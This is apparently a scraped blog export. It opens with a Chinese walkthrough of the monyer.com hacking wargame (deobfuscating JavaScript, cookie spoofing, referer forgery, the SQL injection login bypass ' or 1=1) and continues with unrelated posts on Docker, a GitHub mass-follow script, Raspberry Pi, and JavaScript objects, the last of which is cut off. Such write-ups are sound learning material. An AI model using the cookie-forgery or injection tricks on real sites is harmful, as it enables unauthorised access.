我们知道密码了，并且知道下一关的文件是hello.php\n第二关http://monyer.com/game/game1/hello.php\n审查工具看源代码，head中\n&lt;script type=&quot;text/rocketscript&quot; data-rocketoptimized=&quot;true&quot;&gt;    document.oncontextmenu=function()&#123;return false&#125;;    var a,b,c,d,e,f,g;    a = 3.14;    b = a * 2;    c = a + b;    d = c / b + a;    e = c - d * b + a;    f = e + d /c -b * a;    g = f * e - d + c * b + a;    a = g * g;    a = Math.floor(a);    function check()&#123;        if(document.getElementById(&quot;txt&quot;).value==a)&#123;            window.location.href=a + &quot;.php&quot;;        &#125;else&#123;            alert(&quot;密码错误&quot;);            return false;        &#125;    &#125;&lt;/script&gt;\n\n现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入\nvar a,b,c,d,e,f,g;    a = 3.14;    b = a * 2;    c = a + b;    d = c / b + a;    e = c - d * b + a;    f = e + d /c -b * a;    g = f * e - d + c * b + a;    a = g * g;    a = Math.floor(a);    424178\n好的我们知道a的值是424178，输入，进入下一关\n第三关http://monyer.com/game/game1/424178.php\nhead中存在js\n&lt;script type=&quot;text/rocketscript&quot; data-rocketoptimized=&quot;true&quot;&gt;    eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));&lt;/script&gt;\n\n新时代无须解释，直接上chrome consle\nString.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125)\n输出为\nfunction check()&#123;\tvar a = &#x27;d4g&#x27;;\tif(document.getElementById(&#x27;txt&#x27;).value==a)&#123;\t\twindow.location.href=a+&quot;.php&quot;;\t&#125;else&#123;\t\talert(&quot;密码错误&quot;);\t&#125;&#125;\n好了我们知道了，密码是d4g，下一关！\n第四关http://monyer.com/game/game1/d4g.php\n这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。打开后立即按esc停止。\n&lt;script type=&quot;text/rocketscript&quot; data-rocketoptimized=&quot;true&quot;&gt;    eval(function(p,a,c,k,e,d)&#123;e=function(c)&#123;return c.toString(36)&#125;;if(!&#x27;&#x27;.replace(/^/,String))&#123;while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e)&#123;return d[e]&#125;];e=function()&#123;return&#x27;\\\\w+&#x27;&#125;;c=1&#125;;while(c--)if(k[c])p=p.replace(new RegExp(&#x27;\\\\b&#x27;+e(c)+&#x27;\\\\b&#x27;,&#x27;g&#x27;),k[c]);return p&#125;(&#x27;a=&quot;e&quot;;d c()&#123;b(9.8(\\&#x27;7\\&#x27;).6==a)&#123;5.4.3=a+&quot;.2&quot;&#125;1&#123;0(&quot;密码错误&quot;)&#125;&#125;&#x27;,15,15,&#x27;alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe&#x27;.split(&#x27;|&#x27;),0,&#123;&#125;))&lt;/script&gt;\n\n显然这是一个加密的js，我们需要解密，上解密工具：\nhttp://tool.lu/js/\n解密后：\na = &quot;3bhe&quot;;function check() &#123;\tif (document.getElementById(&#x27;txt&#x27;).value == a) &#123;\t\twindow.location.href = a + &quot;.php&quot;\t&#125; else &#123;\t\talert(&quot;密码错误&quot;)\t&#125;&#125;\n密码是 3bhe 下一关\n诶？怎么不对？仔细检查源代码发现下面还有一行\neval(&quot;\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73&quot;);\n解密！\na = a.toUpperCase() + 1;\n.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go\n第五关http://monyer.com/game/game1/3BHE1.php\n\n密码在哪儿？额，我藏在页面里了哦！\n\n这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？\n找到了，在cookie里\nmonyer:the password for the next level is asdf\n\n下一关！\n第六关http://monyer.com/game/game1/asdf.php\n是个线索题目\nGet the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls …\n真蛋疼把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。\n这个答案是；seventeen\n第七关http://monyer.com/game/game1/seventeen7.php\n社工题\n先解密md5吧\n5e023995fb3f5e840ee684784f8f0799\nhttp://www.somd5.com/\n解密出  eighteen8\n下一关\n第八关http://monyer.com/game/game1/eighteen8.php\n直接看到 一个404 不要着急 审查工具\n&lt;p style=&quot;display:none&quot;&gt;第8关朋友您好，第8关欢迎您！我对您的聪明才智感到惊讶！相信我，现在世界上85%以上的人都在你之下，所以你可以大步向前，义无反顾地进行你的事业了。因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。那么继续我们的约定，我将告诉你第9关的入口：10000以内所有质数和.php&lt;/p&gt;\n10000以内所有质数和，so easy！写个javascript 算一下。\nvar sum = 0;for (var i = 2; i &lt; 10000; i++) &#123;\tvar flag = true;\tfor (var j = 2; j &lt;= Math.sqrt(i); j++) &#123;\t\tif (i % j == 0) flag = false ;\t&#125;    if(flag) &#123;sum = sum + i;&#125;&#125;console.log(sum);5736396\n下一关\n第九关http://monyer.com/game/game1/5736396.php\n在命令行里输入：\nwget http://monyer.com/game/game1/img/4681851790659554.jpgcat 4681851790659554.jpg\n密码藏在图片里\n���^�v��*&#123;I�z��^�iؾSRW�V�6�Z��(����H�����ٹ������Ǿ���ʽ�ʲô���ţ��ԣ�������������������......����ϲ�㣡��ʮ������Ϊ��MonyerLikeYou_the10level�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ������Լ���û��ģ�%\nMonyerLikeYou_the10level\n第十关http://monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n当前用户身份为simpleuser 不是admin，无法显示下一关密码\n\n很显然这是一道session/cookie欺骗题\n在console里直接输入\ndocument.cookie=&quot;username=admin&quot;\n\n刷新\n\n好聪明哦！下一关密码为：doyouknow\n\n下一关！\n第十一关http://monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n你的session不是passer，不能查看下一关密码\n\n在console里直接输入\ndocument.cookie=&quot;username=passer&quot;\n\n刷新，好像不对哦，monyer骗我，哼！\n再看标题 action=show_login_false \nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_true\n\n您的session为passer，所以您可以查看下一关密码：smartboy\n\n下一关！\n第十二关http://monyer.com/game/game1/smartboy.php\nJTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n直觉告诉我，这显然是Base64 解密\n%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n直觉告诉我，这显然是 UrlEncode 解密\nJTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n直觉再次告诉我，这显然是 Base64 解密\n%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n直觉再次告诉我，这显然是  UrlEncode 解密\nsobeautiful.php\n不错 密码就是sobeautiful\n第十三关http://monyer.com/game/game1/sobeautiful.php\n\n本页禁止盗链！\n\nwtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：\n&lt;a href= &quot;http://monyer.com/game/game1/sobeautiful.php&quot;&gt; 简便伪造referer&lt;/a&gt;\n\n欢迎您来到第13关\n请输入密码进入第14关：\n没有输入密码 或 密码错误 或 系统错误！\n\n看源代码有post提交\n这是一道SQL 注入题\n试试我大万能密码！ \n&#x27; or 1=1 \n万能密码熟记于心\n\n下一关密码：whatyouneverknow\n\n下一关！\n第十四关http://monyer.com/game/game1/whatyouneverknow.php\n感谢@Echowxsy提供第14关解密过程\n\n\n\n\n\n\n\n第十五关\n","categories":["Hack"],"tags":["Hack"]},{"title":"Docker下配置SQL Server for Linux","url":"http://www.yfgeek.com/2016/11/22/在Docker下的Ubuntu安装Sql-Server-for-Linux/","content":"前言微软已经不再是以前的那个微软了，如果微软SQL Server早开源几年，估计现在数据库方面就没有Oracle什么事情了。\nCanonical 技术主管 Dustin Kirkland 表示：「微软和 Canonical 继续在 Windows 世界和 Linux 世界之间建立桥梁。 SQL Server on Ubuntu 便是这种趋势的又一示例。」\n\n\n配置要求\nDocker版本在 1.8 以上\n至少 4GB 硬盘空间\n至少 4GB 内存\n\n\n配置拉取docker镜像docker pull microsoft/mssql-server-linux\n运行docker镜像YourStrong!Passw0rd 为你的密码\n1433 为对外端口\ndocker run -e &#x27;ACCEPT_EULA=Y&#x27; -e &#x27;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&#x27; -p 1433:1433 -d microsoft/mssql-server-linux\n🌰 例子\nsudo docker run -e &#x27;ACCEPT_EULA=Y&#x27; -e &#x27;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&#x27; -p 1433:1433 -d microsoft/mssql-server-linux\n\n\n设置 宿主机保存数据目录(暂不支持)&lt;host directory&gt; 为目录\ndocker run -e &#x27;ACCEPT_EULA=Y&#x27; -e &#x27;SA_PASSWORD=&lt;YourStrong!Passw0rd&gt;&#x27; -p 1433:1433 -v &lt;host directory&gt;:/var/opt/mssql -d microsoft/mssql-server-linux\n\n查看容器的ip(调试用)docker inspect --format=&#x27;&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;&#x27; 容器id\n172.17.0.2\n连接用户名是SA\n密码是用户自己设置的\n\n连接成功！\n\n最后内存占用情况\n\n我们一起默念** 微软大法好 ** ** 微软大法好 ** ** 微软大法好 ** 。\n谢谢微软为开源世界做的一切！\n参考https://docs.microsoft.com/zh-cn/sql/linux/sql-server-linux-setup-docker\n","categories":["Docker"],"tags":["Docker","SQLserver"]},{"title":"当我关注3万Github用户后发生了什么","url":"http://www.yfgeek.com/2016/11/19/当我关注3万Githb用户后发生了什么/","content":"前言16天前，写了一个小python程序，自动关注Github里的人，python真是尤物，能快速麻出想做的程序。\n于是乎我利用这个关注了3万人的Github，可是关注后除了同性交友似乎没有什么用，而我发现一件事，就是我的首页动态变化如同刷新浪微博一样，每个人都在star或fork各种项目，不乏很多精品资源。\n \n\n翻都翻不过来，那么同时还存在一些“无用( 垃圾 )项目”，star和fork数量很少，点开没有意义。那么能否写一个python小程序，把“高质量”的项目来源于好友follow的项目都爬出来呢？\n经过短暂的编码，GithubAwesome.py诞生了。\n现在进入AutoGithub项目就可以看到GithubAwesome.py项目\n规则设置一个规则，如果关注的人的动态里刷出来的项目 star数量 大于 最少 star  或 大于 最少 fork，那么就把他输出出来。\n举个🌰\n最少 star 数: 50最少 fork 数: 50\n\n效果如图\n\n配置首先，确保你安装了beautifulsoup4.\npip install beautifulsoup4\n然后编辑GithubAwesome.py文件，请原谅如此土的方式。\nga = GithubAwesome(&#x27;username&#x27;,&#x27;password&#x27;)# loginga.login()ga.get_awesome(1,20,50) # 第一页 规则 min star 20 min or fork 20\n写在最后当你关注超过1K的用户，你会感叹，每天都有精品项目推送的感觉，真好！😁\n","categories":["Github"],"tags":["Github"]},{"title":"树莓派实时温度湿度监测 优化后续","url":"http://www.yfgeek.com/2016/11/17/树莓派实时温度湿度监测 优化后续/","content":"树莓派这个项目已经过去了两月了，一直没有维护，直到我到了英国后发现，在英国连接北京的树莓派网速堪忧，只有100kb/s，每次想查看家里的温度情况，都要等待很长时间才能加载出来，有时候会丢包，这让我很不爽，于是我决定小小的优化一下。\n \n\n优化css js之前写的css与js一直没有压缩，这次决定用gulp压缩一下\n安装 gulp\nnpm install -g gulp \n安装 gulp-uglify 模块\nnpm install gulp-uglify\n安装 gulp-minify-css 模块\nnpm install gulp-minify-css\n压缩源：\nasset/dist/jsasset/dist/css\n\n目标：\nasset/jsasset/css\n\n好的 我们可以开始写gulpfile.js文件了\n// 获取 gulpvar gulp = require(&#x27;gulp&#x27;)// 获取 uglify 模块（用于压缩 JS）var uglify = require(&#x27;gulp-uglify&#x27;)// 获取 minify-css 模块（用于压缩 CSS）var minifyCSS = require(&#x27;gulp-minify-css&#x27;)// 压缩 js 文件// 在命令行使用 gulp script 启动此任务gulp.task(&#x27;script&#x27;, function() &#123;    // 1. 找到文件    gulp.src(&#x27;asset/dist/js/*.js&#x27;)    // 2. 压缩文件        .pipe(uglify())    // 3. 另存压缩后的文件        .pipe(gulp.dest(&#x27;asset/js&#x27;))&#125;)// 压缩 css 文件// 在命令行使用 gulp css 启动此任务gulp.task(&#x27;css&#x27;, function () &#123;    // 1. 找到文件    gulp.src(&#x27;asset/dist/css/*.css&#x27;)    // 2. 压缩文件        .pipe(minifyCSS())    // 3. 另存为压缩文件        .pipe(gulp.dest(&#x27;asset/css&#x27;))&#125;)// 在命令行使用 gulp auto 启动此任务gulp.task(&#x27;auto&#x27;, function () &#123;    // 监听文件修改，当文件被修改则执行 script 任务    gulp.watch(&#x27;js/*.js&#x27;, [&#x27;script&#x27;])    gulp.watch(&#x27;css/*.css&#x27;, [&#x27;css&#x27;])&#125;)// 使用 gulp.task(&#x27;default&#x27;) 定义默认任务// 在命令行使用 gulp 启动 script 任务和 auto 任务gulp.task(&#x27;default&#x27;, [&#x27;script&#x27;, &#x27;css&#x27; , &#x27;auto&#x27;])\n\n执行gulp即可进行自动压缩及监听任务\n结构优化这是原有的结构\n前端：Semantic UI + eCharts + JQuery Datapicker\n数据： json(时间)\n后端：Python + Apache\n后端的python程序负责测温度和测湿度，并生成json数据，为了保证事实性，python程序一直在读写相同的json文件，每一分钟读写一次，造成了json文件的比较大，大概有68KB，在前端是通过ajax加载的json文件，如果网速很慢的话，必然会造成很长时间的延迟。\n为了解决这个问题，首先第一步就是减小json文件大小。设计了一个解决方案是，以前的前端已经可以加载每小时数据和每分钟数据，不过小时和分钟的数据是通过在js中忽略加载实现的。\n而现在采用新的方案，在data数据目录下，分别建立两个目录。\ndata/mindata/hour\n\n数据： json(min) / json(hour) \nmin的数据专门用于保存min,hour专门用于保存hour，为了解决旧数据迁移问题，首先先将内容移动到min目录下，在根目录下写了一个python小程序，执行挑选出hour数据并且迁移。\n#!/usr/bin/pythonimport sysimport timeimport jsonimport osimport stringdef jsonRead(path,topath,name):    pathfile = path + &#x27;/&#x27; + name    topathfile = topath + &#x27;/&#x27; + name    if os.path.exists(pathfile):        file =open(pathfile,&quot;r&quot;)        data = json.loads(file.read().decode(&#x27;utf-8&#x27;))        i = 1        jsonWrite(data[0],topathfile)        for v in data:            i = i + 1            if(i%60==0):                jsonWrite(v,topathfile)        file.close()    else:        print &#x27;unable to open &#x27; + pathfile + &#x27;file&#x27;def jsonWrite(data,pathfile):    if os.path.exists(pathfile):      file =open(pathfile,&quot;rb+&quot;)      file.seek(-1,os.SEEK_END)      file.truncate()      file.write(&quot;,&quot;)      json.dump(data,file)      file.write(&quot;]&quot;)      file.close()      print &#x27;succes: &#x27;+ pathfile    else:      file =open(pathfile,&quot;w&quot;)      file.write(&quot;[&quot;)      json.dump(data,file)      file.write(&quot;]&quot;)      file.close()dir = &#x27;web/data/min&#x27;dist = &#x27;web/data/hour&#x27;files = os.listdir(dir)for root, dirs, files in os.walk(dir):    for name in files:        jsonRead(dir,dist,name)\n与此同时也需要修改 前端js 与 后端python具体代码在 项目地址，不贴了。\n最后，经过优化，速度大概提升了5倍，前端获取的json文件为1KB。\n后续还会增加季度数据统计，等待数据量大一点的时候方便做数据统计工作。\n","categories":["Raspberry"],"tags":["Raspberry"]},{"title":"Github Follow 及 BaiduBlogTransfer 项目","url":"http://www.yfgeek.com/2016/11/08/Github Follow 及 BaiduBlogTransfer 项目/","content":"最近总是有莫名其妙的人关注我的Github，于是乎突发奇想，做了一个Github批量跟随的Python小程序。\n用Python做这种事情最过瘾，Python短小、精炼、库多，非常好用，用了不到2个小时就把整个小程序完成了。\n \n项目地址：\n点击进入项目\n除此之外，我还整理了只去百度空间的Blogs放到了Github封存。\nhttps://github.com/yfgeek/Blog\n目录是用一个python小程序自动生成的，通过修改@cheezer的BaiduBlogTransfer项目的代码，添加了生成Markdown功能，把原来百度空间的内容全部导出来了。\n点击进入项目\n百度空间是我最早的Blog(2007-2011)，小学初中，后转战独立空间VPS，先后用过Worldpress,Ghost以及现在的Hexo。\n百度空间有着很多的回忆，和百度斗智斗勇玩import js的eDIKID.CSS是美好的回忆❤️。\n百度空间被百度关闭了，文章也没有了。\n百度空间为我在初中高中时的玩具，部分内容掺杂当时网络用语，而且现在看来相当多的文章打脸，请不要用现在的眼光和视野去看过去的文章，在那个时候没有现在的思想和技术，所以文章内容过于幼稚。\n❤️:3Mac\n","categories":["github"],"tags":["github"]},{"title":"Docker Compose—简化复杂应用的利器 ","url":"http://www.yfgeek.com/2016/10/15/Docker-Compose—简化复杂应用的利器/","content":"Compose是用于定义和运行复杂Docker应用的工具。你可以在一个文件中定义一个多容器的应用，然后使用一条命令来启动你的应用，然后所有相关的操作都会被自动完成。\n \n1. 安装Docker和Compose# 当前最新的Docker是1.6.2，Compose为1.2.0curl -s https://get.docker.io/ubuntu/ | sudo shsudo apt-get updatesudo apt-get install lxc-docker# 参考http://docs.docker.com/compose/install/#install-composecurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-`uname -s`-`uname -m` &amp;gt; /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose\n### 上面这个方法真的慢出翔，可以通过Python pip安装。apt-get install python-pip python-devpip install -U docker-compose\n\n当前最新的Docker是1.6.2，Compose为1.2.0\nsudo apt-get updatesudo apt-get install lxc-docker\n参考 http://docs.docker.com/compose/install/#install-compose\ncurl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m &gt; /usr/local/bin/docker-compose curl -L https://github.com/docker/compose/releases/download/1.2.0/docker-compose-uname -s-uname -m &gt; /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-compose### 上面这个方法真的慢出翔，可以通过Python pip安装。apt-get install python-pip python-devpip install -U docker-compose\n这样compose就安装好了，查看一下compose的版本信息：\nchmod +x /usr/local/bin/docker-composedocker-compose -versiondocker-compose 1.2.0\n2. 使用Compose使用Compose只需要简单的三个步骤：\n首先，使用Dockerfile来定义你的应用环境：\nFROM python:2.7ADD ./codeWORKDIR /codeRUN pip install -r requirements.txt\n其中，requirements.txt中的内容包括：\nflaskredis\n再用Python写一个简单的app.py\nfrom flask importFlaskfrom redis importRedisimport osapp =Flask(__name__)redis =Redis(host=&#x27;redis&#x27;, port=6379)@app.route(&#x27;/&#x27;)def hello():    redis.incr(&#x27;hits&#x27;)return&#x27;Hello World! I have been seen %s times.&#x27;% redis.get(&#x27;hits&#x27;)if __name__ ==&quot;__main__&quot;:    app.run(host=&quot;0.0.0.0&quot;, debug=True)\n第二步，用一个compose.yaml来定义你的应用服务，他们可以把不同的服务生成不同的容器中组成你的应用\nweb:  build:.  command: python app.py  ports:         - &quot;5000:5000&quot;  volumes:         - .:/code  links:         - redisredis:  image: redis\n第三步，执行docker-compose up来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。\nCreating myapp_redis_1...Creating myapp_web_1...Building web...Step 0 : FROM python:2.72.7: Pulling from python...Status: Downloaded newer image for python:2.7 ---&gt; d833e0b23482Step 1 : ADD . /code ---&gt; 1c04b1b15808Removing intermediate container 9dab91b4410dStep 2 : WORKDIR /code ---&gt; Running in f495a62feac9 ---&gt; ffea89a7b090Attaching to myapp_redis_1, myapp_web_1......redis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379web_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)web_1   |  * Restarting with stat\n3. Yaml文件参考在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：\nimage:镜像的ID\nbuild:直接从pwd的Dockerfile来build，而非通过image选项来pull\nlinks：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]\nexternal_links：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links\ncommand：替换默认的command命令\nports: 导出端口。格式可以是：\nports:-&quot;3000&quot;-&quot;8000:8000&quot;-&quot;127.0.0.1:8001:8001&quot;\nexpose：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。\nvolumes：加载路径作为卷，可以指定只读模式。\nvolumes:-/var/lib/mysql - cache/:/tmp/cache -~/configs:/etc/configs/:ro\n volumes_from：加载其他容器或者服务的所有卷\nenvironment:- RACK_ENV=development  - SESSION_SECRET\nenv_file：从一个文件中导入环境变量，文件的格式为RACK_ENV=development\nextends:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：\ncommon.ymlwebapp:  build:./webapp  environment:- DEBUG=false- SEND_EMAILS=falsedevelopment.ymlweb:extends:    file: common.yml    service: webapp  ports:-&quot;8000:8000&quot;  links:- db  environment:- DEBUG=truedb:  image: postgres\nnet：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。dns：可以设置一个或多个自定义的DNS地址。\ndns_search:可以设置一个或多个DNS的扫描域。\n其他的working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares，和docker run命令是一样的，这些命令都是单行的命令。例如：\ncpu_shares:73working_dir:/codeentrypoint: /code/entrypoint.shuser: postgresqlhostname: foodomainname: foo.commem_limit:1000000000privileged:truerestart: alwaysstdin_open:truetty:true\n4. docker-compose常用命令在第二节中的docker-compose up，这两个容器都是在前台运行的。我们可以指定-d命令以daemon的方式启动容器。除此之外，docker-compose还支持下面参数：\n–verbose：输出详细信息\n-f 制定一个非docker-compose.yml命名的yaml文件\n-p 设置一个项目名称（默认是directory名）\ndocker-compose的动作包括：\nbuild：构建服务\nkill -s SIGINT：给服务发送特定的信号。\nlogs：输出日志\nport：输出绑定的端口\nps：输出运行的容器\npull：pull服务的image\nrm：删除停止的容器\nrun: 运行某个服务，例如docker-compose run webpython manage.py shell\nstart：运行某个服务中存在的容器。\nstop:停止某个服务中存在的容器。\nup：create + run + attach容器到服务。\nscale：设置服务运行的容器数量。例如：docker-compose scale web=2 worker=3\n\n转载:http://debugo.com/docker-compose\n\n","categories":["Docker"],"tags":["Docker"]},{"title":"程序员鄙视链","url":"http://www.yfgeek.com/2016/10/12/程序员鄙视链/","content":"纯粹的一些梗，比较搞笑。来源知乎和其他网站。\n \n\n编辑器Emacs → Vim → Sublime → Word → Power PointVim →→ Emacs + evil插件notepad++ → notepadall → Source Insight → notepad\n语言asm → C ↔ C++ ↔ Java ↔ C# → JavaScript → VB → VBScriptCommon Lisp ↔ Scheme → Emacs Lisp →→ PythonPython ↔ Perl → shellPHP → all\n操作系统Unix → Linux → Windows → DOSSolaris →→ 其他UnixBSD ↔ SystemOpenBSD ↔ FreeBSD → NetBSDArch → Debian* → Redhat*Debian → UbuntuFedora → CentOS → RHELOSX → all\nIDEEmacs + plugins ↔ Vim + plugins → 其他加插件的编辑器IntelliJ → Eclipse → NetBeansCode::Blocks → CodeLiteVS → all → Turbo C 2.0\n图片\n\n\n\n\n** 工具篇 **\n\n\n\n** 系统软件篇 **\n\n\n\n\n** 职场篇 **\n\n\n\n\n\n转载自：https://www.zhihu.com/question/24270600\n\n","categories":["笑话"],"tags":["笑话"]},{"title":"JavaScript创建对象的七种模式","url":"http://www.yfgeek.com/2016/10/11/JavaScript创建对象的七种模式/","content":"&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ECMA-262把对象定义为：”无需属性的集合，其属性可以包含基本值、对象或者函数。”严格来讲，这就相当于说明对象是一组没有特定顺序的值。对象的每个属性或方法都有一个名字，而每个名字都映射到一个值。正因为这样，我们可以把ECMAScript的对象想象成散列表：无非就是一组名对值，其中值可以是数据或函数。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;创建自定义对象最简单的方式就是创建一个Object的实例，然后再为他添加属性和方法，如下所示：var person = new Object();、person.name = \"liubei\";person.age = 29;person.job = \"shayemuyou\";person.sayName = function()&#123;\n &nbsp; &nbsp;&nbsp; alert(this.name);&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上面的例子创建了一个名为person的对象，并为他添加了三个属性和一个方法。其中sayName()方法用于显示name属性，this.name将被解析为person.name，早期的开发人员经常使用这个模式来创建对象，后来对象字面量的方法成了创建对象的首选模式，上面的例子用对象字面量的语法可以写成如下这样：var person = &#123;\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;name:\"liubei\",\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;age:29,\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;job:\"shayemuyou\",\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;sayName:function()&#123;\n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;alert(this.name);\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;&#125;&#125;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个例子中的person对象和前面的对象是一样的，都有相同的属性和方法。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;虽然Object构造函数或者对象字面量的方法都可以用来创建单个对象，但是这些方法有个明显的缺点：使用同一个接口创建很多对象，会产生大量的重复代码。为了解决这个方法，人们开始使用工厂模式的一种变体。一、工厂模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;工厂模式是软件工程领域一种广为人知的设计模式，这种模式抽象了创建具体对象的过程。考虑到ECMAScript中无法创建类，开发人员就发明了一种函数，用函数来封装以特定接口创建对象的细节，如下所示：function createPerson(name, age, job)&#123;\n &nbsp; var o = new Object(); &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.name = name;  &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.age = age;  &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.job = job; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; o.sayName = function()&#123;\n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; alert(this.name);\n &nbsp; &nbsp;&nbsp; &#125; &nbsp;return o;&#125;var person1 = createPerson(\"wei\",25,\"software\");var person2 = createPerson(\"bu\",25,\"software\");&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;函数createPerson()能够根据接受的参数来构建一个包含所有必要信息的Person对象。可以多次调用这个函数，每次都会返回一个包含三个属性一个方法的对象。工厂模式虽然解决了创建多个相似对象的问题，但却没有解决对象识别的问题，即怎么样知道这是哪个对象类型。二、构造函数模式&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;像Array、Object这样的原生构造函数，在运行时会自动出现在执行环境中。此外，我们可以创建自定义个构造函数，从而定义自定义类型的属性和方法。例如，我们可以使用构造函数重写上个例子：function Person(name, age, job)&#123; &nbsp; &nbsp; &nbsp; &nbsp;this.name = name; &nbsp; &nbsp;this.age = age; &nbsp; &nbsp;this.job = job; &nbsp; &nbsp;this.sayName = function()&#123;\n &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp;alert(this.name);\n &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp;&#125;&#125;var person1 = new Person(\"wei\",25,\"software\");var person2 = new 